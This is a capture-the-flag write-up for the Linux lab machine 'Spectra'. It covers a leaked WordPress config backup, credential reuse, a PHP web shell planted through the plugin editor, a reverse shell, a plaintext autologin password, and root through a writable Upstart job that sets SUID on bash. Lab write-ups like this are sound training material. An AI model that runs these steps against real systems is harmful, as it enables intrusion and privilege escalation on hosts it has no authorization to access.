# Spectra

**Difficulty:** Easy | **OS:** Linux | **IP:** 10.129.88.9

## Summary

Spectra is an easy-difficulty Linux machine featuring a WordPress-based issue tracker. Directory enumeration uncovers an exposed configuration backup containing database credentials, which are reused to log into the WordPress admin panel. From there, the plugin editor is abused to achieve remote code execution and obtain a reverse shell. Lateral movement is achieved via an exposed autologin password file, and privilege escalation is accomplished by abusing group write permissions on Upstart job files combined with a `sudo` rule for `initctl`.

## Reconnaissance

### Port Scanning (Nmap)

- **22**: ssh (OpenSSH 8.1 (protocol 2.0))
- **80**: http (nginx 1.17.4)
- **3306**: mysql (MySQL (unauthorized))

## Web Enumeration

The main page (`http://spectra.htb/`) discloses the following content:

```
# Issue Tracking

## Until IT set up the Jira we can configure and use this for issue tracking.

## [Software Issue Tracker](http://spectra.htb/main/index.php)

## [Test](http://spectra.htb/testing/index.php)
```

Directory brute-forcing with gobuster reveals:

/index.html (Status: 200) [Size: 283]
/main        (Status: 301) [Size: 169] [--> http://spectra.htb/main/]

`/main` hosts a **WordPress 5.4.2** installation. `/wp-admin` is reachable, and the login form confirms the existence of the `administrator` user (valid username, invalid password).

## Exposed Configuration Backup

Enumerating `/testing/` reveals an accessible backup file:

`http://spectra.htb/testing/wp-config.php.save`

Relevant content:

```
php
/** MySQL database username */ define( 'DB_USER', 'devtest' );
/** MySQL database password */ define( 'DB_PASSWORD', 'devteam01' );
/** MySQL hostname */ define( 'DB_HOST', 'localhost' );
```

- The credentials `devtest`:`devteam01` do not grant SSH access.
- Reusing the password `devteam01` against the WordPress `administrator` account succeeds.

Once authenticated, the associated contact email is retrieved: `devteam@megabank.local`.

## Exploitation (User Flag)

### WordPress Plugin Editor RCE

With administrator access to WordPress, the Plugin Editor (`Plugins` → `Plugin Editor`) is used to modify the akismet.php plugin file, inserting:

```
system($_GET['cmd']);
```

The RCE is confirmed by browsing to:

`http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?cmd=id`

### Shell Stabilization

A reverse shell payload (crafted with the help of revshells.com) is triggered through the same parameter, granting a connection back as the web server user (`www-data/nginx`).

## Lateral Movement

### Credential Hunting

Local credential stores are reviewed. The NSS database yields no usable plaintext credentials:

```
sqlite3 ./nginx/.pki/nssdb/key4.db
.tables
select * from metaData;
```

An exposed autologin file is found instead:

`/opt/etc/autologin/passwd`

Contents: `SummerHereWeCome!!`

This password is valid for SSH authentication as the user `katie`, granting access to the `user.txt` flag.

## Privilege Escalation (Root Flag)

Sudo Enumeration

```
sudo -l

User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

### Group Permissions Abuse

```
find / -group developers 2>/dev/null | xargs ls -l
-rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test1.conf
...
-rwxrwxr-x 1 root developers  251 Jun 29  2020 /srv/nodetest.js
```

`katie` belongs to the `developers` group, which grants write access to the Upstart job definitions under `/etc/init/`.

### Upstart Job Hijacking

One of the writable jobs (e.g. `test10.conf`) is edited to add an `exec` directive that sets the SUID bit on `/bin/bash`:

```
exec chmod u+s /bin/bash
```

The job is then restarted via the permitted sudo command:

```
sudo -u root /sbin/initctl start test10
```

Since the job executes with `root` privileges, chmod runs as root, leaving `/bin/bash` with the SUID bit set.

### Root Shell

```
bash -p
```

This spawns a shell with effective `root` privileges, allowing retrieval of `root.txt`.
